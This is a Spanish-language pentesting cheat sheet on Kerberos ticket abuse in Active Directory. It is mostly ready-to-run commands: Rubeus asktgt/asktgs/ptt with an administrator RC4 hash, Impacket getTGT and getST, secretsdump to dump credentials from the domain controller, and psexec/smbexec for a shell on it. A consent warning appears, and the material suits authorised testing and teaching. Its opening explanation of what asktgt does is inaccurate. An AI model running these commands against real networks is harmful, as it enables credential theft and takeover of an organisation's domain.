
# ASK-TGT

El ASK-TGT es utilizado por herramientas como Mimikatz para extraer los tickets de autenticación (TGT) válidos de los usuarios autenticados en el sistema. Si un atacante tiene acceso a un ASK-TGT válido, puede utilizar herramientas como Rubeus, Impacket o Mimikatz para extraer las claves criptográficas del ticket y utilizarlas para autenticarse en otros sistemas y aplicaciones del entorno de Active Directory.

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a conseguir credenciales y información sensible en una organización por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">ASK-TGT con Rubeus</mark>

#### Ticket Granting Ticket y su clave de sesión encriptada de un usuario administrador

{% code title="Windows de empleado" %}

```csharp
.\Rubeus.exe asktgt /domain:corp.local /user:administrador /rc4:a87f3a337d73085c45f9416be5787d86
```

{% endcode %}

#### Solicitar ticket de servicio:&#x20;

{% code title="Windows de empleado" %}

```csharp
.\Rubeus.exe asktgs /ticket:TICKET_SIN_ESPACIOS /service:cifs/DC01.corp.local
# Nos da el ticket de servicio que debemos editar sin espacios ni saltos de línea

.\Rubeus.exe ptt /ticket:TICKET_EDITADO
```

{% endcode %}

## <mark style="color:purple;">ASK-TGT en Kali</mark>&#x20;

Meter Kali en Dominio por IP

### Con Impacket

```csharp
impacket-getTGT corp.local/administrador -hashes :HASH_ADMIN
# Lo vuelca a administrador.ccache
impacket-secretsdump -h 
# Copiar la variable de entorno de Kerberos, apartado -k, (KRB5CCNAME)
export KRB5CCNAME=/home/kali/Escritorio/administrador.ccache
impacket-secretsdump corp.local/administrador@DC01.corp.local -k -no-pass 
# Nos vuelca la SAM del equipo
impacket-psexec corp.local/administrador@DC01.corp.local -k -no-pass 
# Nos da una sesión reversa con shell al DC)
impacket-smbexec corp.local/administrador@DC01.corp.local -k -no-pass
```

### Solicitar ticket de servicio Ad-Hoc

```csharp
impacket-getST -spn cifs/DC01.corp.local -no-pass -k corp.local/administradorc
```
